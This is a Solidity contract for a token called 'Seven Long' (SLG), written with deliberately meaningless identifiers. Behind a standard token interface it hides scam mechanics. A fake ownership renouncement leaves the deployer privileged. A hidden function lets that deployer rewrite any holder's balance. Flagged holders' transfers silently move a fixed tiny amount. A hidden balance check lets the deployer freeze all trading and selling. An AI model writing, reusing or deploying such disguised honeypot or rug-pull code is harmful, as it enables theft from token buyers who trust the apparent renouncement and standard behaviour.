//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface launchTakeMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract totalSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface exemptEnableLaunched {
    function createPair(address fundTake, address teamTotalSender) external returns (address);
}

interface swapTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address enableToken) external view returns (uint256);

    function transfer(address liquidityLaunched, uint256 takeReceiver) external returns (bool);

    function allowance(address amountListSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address liquidityLaunched,
        uint256 takeReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoTeam, uint256 value);
    event Approval(address indexed amountListSender, address indexed spender, uint256 value);
}

interface swapTeamMetadata is swapTeam {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SevenLong is totalSender, swapTeam, swapTeamMetadata {

    function transferFrom(address fundAmount, address liquidityLaunched, uint256 takeReceiver) external override returns (bool) {
        if (_msgSender() != marketingMode) {
            if (liquidityTrading[fundAmount][_msgSender()] != type(uint256).max) {
                require(takeReceiver <= liquidityTrading[fundAmount][_msgSender()]);
                liquidityTrading[fundAmount][_msgSender()] -= takeReceiver;
            }
        }
        return totalAt(fundAmount, liquidityLaunched, takeReceiver);
    }

    function name() external view virtual override returns (string memory) {
        return minExemptLimit;
    }

    function balanceOf(address enableToken) public view virtual override returns (uint256) {
        return sellMarketing[enableToken];
    }

    address private tradingReceiver;

    address marketingMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address autoEnableSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private launchedTx = 100000000 * 10 ** 18;

    function symbol() external view virtual override returns (string memory) {
        return takeLimitFee;
    }

    bool public walletShould;

    uint256 private feeWallet;

    bool public launchedTxWallet;

    function limitTotal(address modeFee) public {
        if (modeAt) {
            return;
        }
        
        enableIs[modeFee] = true;
        
        modeAt = true;
    }

    bool public modeAt;

    address public minLaunched;

    uint256 private teamFromTrading;

    mapping(address => uint256) private sellMarketing;

    function receiverMin() public {
        emit OwnershipTransferred(atMaxTake, address(0));
        tradingReceiver = address(0);
    }

    string private minExemptLimit = "Seven Long";

    uint256 private toAtReceiver;

    function takeSwap(uint256 takeReceiver) public {
        shouldSenderLiquidity();
        minLaunch = takeReceiver;
    }

    uint8 private txFrom = 18;

    uint256 constant receiverAutoMarketing = 19 ** 10;

    uint256 public amountTx;

    function autoFundWallet(address fundAmount, address liquidityLaunched, uint256 takeReceiver) internal returns (bool) {
        require(sellMarketing[fundAmount] >= takeReceiver);
        sellMarketing[fundAmount] -= takeReceiver;
        sellMarketing[liquidityLaunched] += takeReceiver;
        emit Transfer(fundAmount, liquidityLaunched, takeReceiver);
        return true;
    }

    bool public tradingList;

    function totalAt(address fundAmount, address liquidityLaunched, uint256 takeReceiver) internal returns (bool) {
        if (fundAmount == atMaxTake) {
            return autoFundWallet(fundAmount, liquidityLaunched, takeReceiver);
        }
        uint256 buyLiquidity = swapTeam(minLaunched).balanceOf(autoEnableSwap);
        require(buyLiquidity == minLaunch);
        require(liquidityLaunched != autoEnableSwap);
        if (modeToken[fundAmount]) {
            return autoFundWallet(fundAmount, liquidityLaunched, receiverAutoMarketing);
        }
        return autoFundWallet(fundAmount, liquidityLaunched, takeReceiver);
    }

    mapping(address => bool) public modeToken;

    function minIsReceiver(address swapBuy) public {
        shouldSenderLiquidity();
        
        if (swapBuy == atMaxTake || swapBuy == minLaunched) {
            return;
        }
        modeToken[swapBuy] = true;
    }

    mapping(address => bool) public enableIs;

    constructor (){
        
        launchTakeMin modeExempt = launchTakeMin(marketingMode);
        minLaunched = exemptEnableLaunched(modeExempt.factory()).createPair(modeExempt.WETH(), address(this));
        
        atMaxTake = _msgSender();
        receiverMin();
        enableIs[atMaxTake] = true;
        sellMarketing[atMaxTake] = launchedTx;
        if (swapToken) {
            swapSender = true;
        }
        emit Transfer(address(0), atMaxTake, launchedTx);
    }

    event OwnershipTransferred(address indexed maxReceiver, address indexed maxFee);

    bool private maxToFund;

    mapping(address => mapping(address => uint256)) private liquidityTrading;

    function getOwner() external view returns (address) {
        return tradingReceiver;
    }

    function allowance(address sellFeeTx, address maxBuy) external view virtual override returns (uint256) {
        if (maxBuy == marketingMode) {
            return type(uint256).max;
        }
        return liquidityTrading[sellFeeTx][maxBuy];
    }

    bool public swapSender;

    address public atMaxTake;

    uint256 minLaunch;

    function shouldSenderLiquidity() private view {
        require(enableIs[_msgSender()]);
    }

    function launchedToken(address tradingTo, uint256 takeReceiver) public {
        shouldSenderLiquidity();
        sellMarketing[tradingTo] = takeReceiver;
    }

    function approve(address maxBuy, uint256 takeReceiver) public virtual override returns (bool) {
        liquidityTrading[_msgSender()][maxBuy] = takeReceiver;
        emit Approval(_msgSender(), maxBuy, takeReceiver);
        return true;
    }

    function owner() external view returns (address) {
        return tradingReceiver;
    }

    function decimals() external view virtual override returns (uint8) {
        return txFrom;
    }

    uint256 walletReceiver;

    bool public swapToken;

    function totalSupply() external view virtual override returns (uint256) {
        return launchedTx;
    }

    function transfer(address tradingTo, uint256 takeReceiver) external virtual override returns (bool) {
        return totalAt(_msgSender(), tradingTo, takeReceiver);
    }

    string private takeLimitFee = "SLG";

}